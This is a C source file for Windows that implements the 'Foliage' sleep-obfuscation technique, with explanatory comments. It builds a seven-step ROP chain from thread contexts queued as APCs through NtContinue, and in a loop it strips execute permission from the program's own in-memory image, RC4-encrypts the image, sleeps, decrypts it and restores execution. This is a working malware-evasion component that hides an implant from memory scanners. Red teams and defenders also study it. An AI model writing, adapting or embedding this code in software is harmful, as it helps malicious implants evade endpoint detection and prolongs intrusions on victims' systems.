#include <windows.h>
#include <stdio.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* PUSER_THREAD_START_ROUTINE)(PVOID ThreadParameter);
typedef VOID(NTAPI* PPS_APC_ROUTINE)(PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);

typedef struct _PS_ATTRIBUTE{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef enum _EVENT_TYPE {
    NotificationEvent,      // manual reset Stays signaled until you reset it
    SynchronizationEvent    // auto reset Resets after waiter wakes
} EVENT_TYPE;

typedef struct _WIN32_API {
    NTSTATUS(NTAPI* NtCreateEvent)(PHANDLE EventHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, EVENT_TYPE EventType, BOOLEAN InitialState);
    
    NTSTATUS(NTAPI* NtCreateThreadEx)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PUSER_THREAD_START_ROUTINE StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
    
    NTSTATUS(NTAPI* NtGetContextThread)(HANDLE ThreadHandle, PCONTEXT ThreadContext);

    NTSTATUS(NTAPI* NtWaitForSingleObject)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);

    NTSTATUS(NTAPI* NtSignalAndWaitForSingleObject)(HANDLE SignalHandle,HANDLE WaitHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);

    NTSTATUS(NTAPI* NtQueueApcThread)(HANDLE ThreadHandle, PPS_APC_ROUTINE ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);

    NTSTATUS(NTAPI* NtAlertResumeThread)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);

    PVOID SystemFunction032; // RC4
    PVOID NtContinue;        // "set all register and jump" our ROP gadget
    PVOID NtTestAlert;       // processes queued APCs Our thread's return addr


} WIN32_API, *PWIN32_API;

#define C_PTR( x ) ( PVOID ) x
#define U_PTR( x ) ( UINT_PTR ) x

BOOL InitializeWinApi32(PWIN32_API pWin32Apis) {
    HMODULE hNtdll = GetModuleHandleA("ntdll");
    if (!hNtdll)
    {
        printf("[-] GetModuleHandleA Failed %ld \n", GetLastError());
        return FALSE;
    }

    pWin32Apis->NtCreateEvent                  = (void*)GetProcAddress(hNtdll, "NtCreateEvent");
    pWin32Apis->NtCreateThreadEx               = (void*)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pWin32Apis->NtGetContextThread             = (void*)GetProcAddress(hNtdll, "NtGetContextThread");
    pWin32Apis->NtWaitForSingleObject          = (void*)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    pWin32Apis->NtSignalAndWaitForSingleObject = (void*)GetProcAddress(hNtdll, "NtSignalAndWaitForSingleObject");
    pWin32Apis->NtQueueApcThread               = (void*)GetProcAddress(hNtdll, "NtQueueApcThread");
    pWin32Apis->NtAlertResumeThread            = (void*)GetProcAddress(hNtdll, "NtAlertResumeThread");
    pWin32Apis->NtTestAlert                    = (void*)GetProcAddress(hNtdll, "NtTestAlert");
    pWin32Apis->NtContinue                     = (void*)GetProcAddress(hNtdll, "NtContinue");
    pWin32Apis->SystemFunction032              = (void*)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    return TRUE;
}

ULONG Random32()
{
    UINT32 Seed = 0;
    _rdrand32_step(&Seed);
    return Seed;
}


// Foliage Main Core
VOID FoliageObf(PWIN32_API pWin32Api, ULONG dwTimeOut)
{
    NTSTATUS Status = { 0 };
    STRING Key = { 0 };         // RC4 Key descriptor for SystemFunction032
    STRING Img = { 0 };         // Image descriptor for SystemFunction032
    BYTE Rnd[16] = { 0 };       // 16-byte random key
    CONTEXT Ctx[7] = { 0 };     // 7 ROP frames (one per "call")
    CONTEXT CtxInit = { 0 };    // base context from the suspended thread
    HANDLE EventSync = NULL;    // Synchronization Gate
    ULONG Protect = 0;          // VirtualProtect old-Protection Output
    HANDLE Thread = NULL;       // our ROP executor thread
    PVOID ImageBase = NULL;
    ULONG ImageSize = 0;

    // Generate a fresh 16-byte RC4 key each cycle
    for (int i = 0; i < 16; i++)
    {
        Rnd[i] = (BYTE)Random32();
    }

    // Find our own PE Image in memory
    // GetModuleHandleA(NULL) = base of current .exe
    // Then walk DOS Header -> NT Header -> OptionalHeader.SizeOfImage
    Img.Buffer = ImageBase = GetModuleHandleA(NULL);
    Img.Length = ImageSize = ((PIMAGE_NT_HEADERS)(U_PTR(Img.Buffer) + ((PIMAGE_DOS_HEADER)Img.Buffer)->e_lfanew))->OptionalHeader.SizeOfImage;

    // SystemFunction expects STRING structs for input + key
    Key.Buffer = Rnd;
    Key.Length = sizeof(Rnd);

    printf("[+] Foliage Chain Start \n");
    printf("[*] Image @ %p [%d bytes] \n", ImageBase, ImageSize);
    printf("[*] Key   @ %p [%d bytes] \n", Key.Buffer, Key.Length);

    
    // Create a synchronization event (the "gate")
    // The ROP Chain's first step waits on this, nothing execution
    // Until our main thread signals it
    if (!NT_SUCCESS(Status = pWin32Api->NtCreateEvent(&EventSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE)))
    {
        printf("[-] NtCreateEvent Failed: %lx \n", Status);
        goto _END_OF_CODE;
    }

    // Create a SUSPENDED thread (CreateFlags = TRUE = suspended)
    if (!NT_SUCCESS(Status = pWin32Api->NtCreateThreadEx(&Thread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL)))
    {
        printf("[-] NtCreateThreadEx Failed: %lx \n", Status);
        goto _END_OF_CODE;
    }

    printf("[+] Thread created: %p \n", Thread);

    // Capture the thread's full register state
    // We'll clone this into 7 copies and modify each one
    CtxInit.ContextFlags = CONTEXT_FULL;
    if (!NT_SUCCESS(Status = pWin32Api->NtGetContextThread(Thread, &CtxInit)))
    {
        printf("[-] NtGetContextThread Faild: %lx \n", Status);
        goto _END_OF_CODE;
    }

    // Plant NtTestAlert as the return address on the thread's stack
    // When the last APC Finishes, the thread "returns" hrer
    *(PVOID*)CtxInit.Rsp = pWin32Api->NtTestAlert;

    for ( int i = 0; i < ARRAYSIZE(Ctx); i++)
    {
        memcpy(&Ctx[i], &CtxInit, sizeof(CONTEXT));
    }

    // --- ROP CHAIN: 7 staged function calls ---

    // [0] Wait on the sync event - holds until main thread signals
    Ctx[0].Rip = U_PTR(pWin32Api->NtWaitForSingleObject);
    Ctx[0].Rcx = U_PTR(EventSync);
    Ctx[0].Rdx = U_PTR(FALSE);
    Ctx[0].R8  = U_PTR(NULL);

    // [1] Mark image memory as read-write (strip execute)
    Ctx[1].Rip = U_PTR(VirtualProtect);
    Ctx[1].Rcx = U_PTR(ImageBase);
    Ctx[1].Rdx = U_PTR(ImageSize);
    Ctx[1].R8  = U_PTR(PAGE_READWRITE);
    Ctx[1].R9  = U_PTR(&Protect);

    // [2] RC4 encrypt the image
    Ctx[2].Rip = U_PTR(pWin32Api->SystemFunction032);
    Ctx[2].Rcx = U_PTR(&Img);
    Ctx[2].Rdx = U_PTR(&Key);

    // [3] Sleep - wait on current process handle (never signals, so it times out)
    Ctx[3].Rip = U_PTR(WaitForSingleObjectEx);
    Ctx[3].Rcx = U_PTR(GetCurrentProcess());
    Ctx[3].Rdx = U_PTR(dwTimeOut);
    Ctx[3].R8  = U_PTR(FALSE);

    // [4] RC4 decrypt (symmetric - same operation undoes it)
    Ctx[4].Rip = U_PTR(pWin32Api->SystemFunction032);
    Ctx[4].Rcx = U_PTR(&Img);
    Ctx[4].Rdx = U_PTR(&Key);

    // [5] Restore execute permission
    Ctx[5].Rip = U_PTR(VirtualProtect);
    Ctx[5].Rcx = U_PTR(ImageBase);
    Ctx[5].Rdx = U_PTR(ImageSize);
    Ctx[5].R8  = U_PTR(PAGE_EXECUTE_READ);
    Ctx[5].R9  = U_PTR(&Protect);

    // [6] Exit the worker thread
    Ctx[6].Rip = U_PTR(ExitThread);
    Ctx[6].Rcx = U_PTR(0);

    printf("[*] Queue up APC calls\n");

    // Queue each ROP frame as an APC
    // APC routine = NtContinue, Arg1 = &Ctx[i]
    // NtContinue loads all registers from the CONTEXT and jumps to Rip
    for (int i = 0; i < ARRAYSIZE(Ctx); i++)
    {
        if (!NT_SUCCESS(Status = pWin32Api->NtQueueApcThread(
                Thread, C_PTR(pWin32Api->NtContinue),
                &Ctx[i], FALSE, NULL)))
        {
            printf("[-] NtQueueApcThread Failed: %lx\n", Status);
            goto _END_OF_CODE;
        }
    }

    // Resume the thread - it starts draining its APC queue
    if (!NT_SUCCESS(Status = pWin32Api->NtAlertResumeThread(Thread, NULL)))
    {
        printf("[-] NtAlertResumeThread Failed: %lx\n", Status);
        goto _END_OF_CODE;
    }

    printf("[*] Trigger obfuscation chain\n");

    // Signal the event (unlocks Ctx[0]) AND wait for the thread to finish
    // This is atomic - signal + wait in one syscall
    if (!NT_SUCCESS(Status = pWin32Api->NtSignalAndWaitForSingleObject(
            EventSync, Thread, TRUE, NULL)))
    {
        printf("[-] NtSignalAndWaitForSingleObject Failed: %lx\n", Status);
        goto _END_OF_CODE;
    }

    printf("[*] Obfuscation cycle complete\n\n");


_END_OF_CODE:
    if (EventSync) { CloseHandle(EventSync); EventSync = NULL; }
    if (Thread)    { CloseHandle(Thread);    Thread = NULL;    }
}


int main()
{

    printf("[+] Foliage Sleep Mask \n");
    WIN32_API Win32Api = { 0 };
    ULONG dwDelay = 5 * 1000;  // 5 seconds

    printf("[*] Foliage Sleep Obfuscation\n\n");

    if (!InitializeWinApi32(&Win32Api)) {
        printf("[-] Failed to initialize APIs\n");
        return -1;
    }

    while (TRUE) {
        FoliageObf(&Win32Api, dwDelay);
    }

    return 0;
}